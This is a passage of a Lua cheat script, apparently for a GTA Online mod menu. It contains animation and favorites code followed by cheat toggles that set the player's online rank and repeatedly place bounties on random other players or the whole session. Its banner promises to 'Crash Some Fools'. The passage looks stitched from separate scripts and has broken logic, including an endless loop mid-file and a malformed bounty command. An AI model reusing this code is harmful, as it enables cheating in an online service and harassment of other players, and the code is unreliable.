        table.insert(favorites, { group, anim })
        populate_favorites()
        save_favorites()
        util.toast("Added " .. group .. "\n" .. anim .. " to favorites")
    else
        clear_anim_props()
        STREAMING.REQUEST_ANIM_DICT(group)
        while not STREAMING.HAS_ANIM_DICT_LOADED(group) do
            util.yield(100)
        end
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        

        if not is_anim_in_recent(group, anim) and not doNotAddRecent then
            add_anim_to_recent(group, anim)
        end

        -- Play animation on all npcs if enabled:
        if affectType > 0 then
            local peds = entities.get_all_peds_as_handles()
            for _, npc in ipairs(peds) do
                if not PED.IS_PED_A_PLAYER(npc) and not PED.IS_PED_IN_ANY_VEHICLE(npc, true) then
                    _play_animation(npc, group, anim, flags, duration, props)
                end
            end
        end
        -- Play animation on self if enabled:
        if affectType == 0 or affectType == 2 then
            _play_animation(ped, group, anim, flags, duration, props)
        end
        STREAMING.REMOVE_ANIM_DICT(group)
    end
end

function _play_animation(ped, group, animation, flags, duration, props)
    if clearActionImmediately then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end
    if props ~= nil then
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        for _, propData in ipairs(props) do
            local boneIndex = PED.GET_PED_BONE_INDEX(ped, propData.Bone)
            local hash = util.joaat(propData.Prop)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end
            local object = entities.create_object(hash, pos)
            animAttachments[object] = propData.DeleteOnEnd ~= nil
            ENTITY.ATTACH_ENTITY_TO_ENTITY(
                object, ped, boneIndex,
                propData.Placement[1] or 0.0,
                propData.Placement[2] or 0.0,
                propData.Placement[3] or 0.0,
                propData.Placement[4] or 0.0,
                propData.Placement[5] or 0.0,
                propData.Placement[6] or 0.0,
                false,
                true,
                false,
                true,
                1,
                true
            )
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        end
    end
    TASK.TASK_PLAY_ANIM(ped, group, animation, 8.0, 8.0, duration, flags, 0.0, false, false, false)
end

------------------------------
-- Loading & Saving Favorites
--------------------------------
local path = filesystem.stand_dir() .. "/Favorite Animations.txt"
if filesystem.exists(path) then
    local headerRead = false
    for line in io.lines(path) do
        if headerRead then
            chunks = {}
            for substring in string.gmatch(line, "%S+") do
                table.insert(chunks, substring)
            end
            if #chunks == 2 or #chunks == 3 then
                table.insert(favorites, chunks)
            end
        else
            headerRead = true
        end
    end
    populate_favorites()
end
function save_favorites()
    local file = io.open(path, "w")
    file:write("category\t\tanimation name\t\talias (no spaces)\n")
    for _, favorite in ipairs(favorites) do
        if favorite[3] then
            file:write(string.format("%s %s %s\n", favorite[1], favorite[2], favorite[3]))
        else
            file:write(string.format("%s %s\n", favorite[1], favorite[2]))
        end
    end
    file:close()
end

----------------------------------------------------------------------------------------------------------------


	menu.toggle(protex, "Rank 420", {"rank"}, "Note: If you save the profile with it toggled it will give you pemanant 420 rank", function(on_toggle)
		--notification("Setting Rank 420...", colors.red)
		menu.trigger_commands("setrank" .. " 420")
	end)

	menu.toggle(protex, "FPS Boost", {"fpsboost"}, "Wait a few seconds for 5-10 FPS Boost.", function(on_toggle)
	if on_toggle then
		--notification("Setting FPS...", colors.green)
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("noidlecam ")
	else
		--notification("Resetting FPS...", colors.red)
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("noidlecam ")
		end
	end)

	menu.toggle(protex, "FPS Boost No Sky", {"fpsnsboost"}, "Wait a few seconds 10-15 FPS Boost.", function(on_toggle)
	if on_toggle then
		--notification("Setting FPS...", colors.green)
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("potatomode ")
        menu.trigger_commands("nosky ")
        menu.trigger_commands("noidlecam ")
	else
		--notification("Resetting FPS...", colors.red)
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("potatomode ")
        menu.trigger_commands("nosky ")
        menu.trigger_commands("noidlecam ")
		end
	end)

bountyloop = menu.list(protex, "Bounty Loops", {}, "", function(); end)


--coded by MrWall 

util.show_corner_help("~s~Loaded ~o~" .. SCRIPT_FILENAME .. " ~p~;)\n~s~Let's Farm Some ~g~$$$ ~p~Or ~o~Crash ~p~Some ~o~Fools ~p~;)")



local playerList = players.list(false, true, true)
local notify = false
local amount = {1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000}
local randomamount = 10000


--Header
menu.divider(bountyloop, "Bounty Loops")

local next_loop_time
local has_bounty = false
menu.toggle_loop(bountyloop, "Bounty Loop", {"bountyloop"}, "Still experimental", function(on)
    if next_loop_time == nil or util.current_time_millis() > next_loop_time then
        local delay
        if not has_bounty then
            local command = "bounty "..players.get_name(players.user()).." 10000"
            --notification("set bounty..", "~b~")
            menu.trigger_commands(command)
            has_bounty = true
            delay = 10000
        else
            --notification("removing bounty...", "~b~")
            menu.trigger_commands("removebounty")
            has_bounty = false
            delay = 1000
        end
        next_loop_time = util.current_time_millis() + delay
    end
end)

--Waiting time
delay = 30
menu.slider(bountyloop, "Repeat Colldown", {"bdelay"}, "Set the time on how long the script waits to give the next player a bounty (time is in sec)", 10, 300, delay, 5, function(value)
	delay = value
end)

--Random Amount
function random_pay()
	while randomamount <= 10000  do
		randomamount = amount[math.random(#amount)]
		util.yield(delay * 100)
	end
	return randomamount 
end

menu.toggle(bountyloop, "Random payout¿", {}, "Set random pay bounty loops\n\nActive = random", function(d)
	if d then
		random_pay()
	else
		randomamount = 10000
	end
end)

menu.toggle(bountyloop, "--notifications Off", {}, "By default --notifications are turned OFF", function(on)
	if on then
		notify = true
		util.show_corner_help("~p~--notifications ~g~On")
	else
		notify = false
		util.show_corner_help("~p~--notifications ~r~Off")
	end
end)

--Bounty Toggle
menu.toggle_loop(bountyloop, "Start Loops", {}, "Will get a random players and give them bounty on set time", function()
	if #playerList > 0 then
		randomPlayer = players.get_name(playerList[math.random(1, #playerList)])
		menu.trigger_commands("bounty" .. randomPlayer .. " " .. randomamount)
		if notify then
			util.show_corner_help("~o~Bounty placed~y~... \n~r~$ ~w~= " .. randomamount)
			if not util.BEGIN_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED("~p~--notifications ~g~On") then
				util.show_corner_help("~o~Bounty placed~y~... \n~r~$ ~w~= " .. randomamount)
			end
		end
			util.yield(delay * 1000)
	else
		util.show_corner_help("Lobby has ~r~no ~w~other ~o~players.\n\n~w~Consider ~g~joining ~w~a ~g~new one.")
		util.yield(60000)
	end
end)

enabled = false
menu.toggle(bountyloop, "Infinite bountys Loop", {"infinibounty"}, "Places a 10k bounty on the entire session again and again.", function(on)
    if on then
        enabled = true
    else
        enabled = false
    end
end, false)

while true do
    if enabled then
        menu.trigger_commands("bountyall 10000")
    end
    util.yield(1000)
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
util.on_stop(function()
	util.log("Later pussy (Yawn)")
end)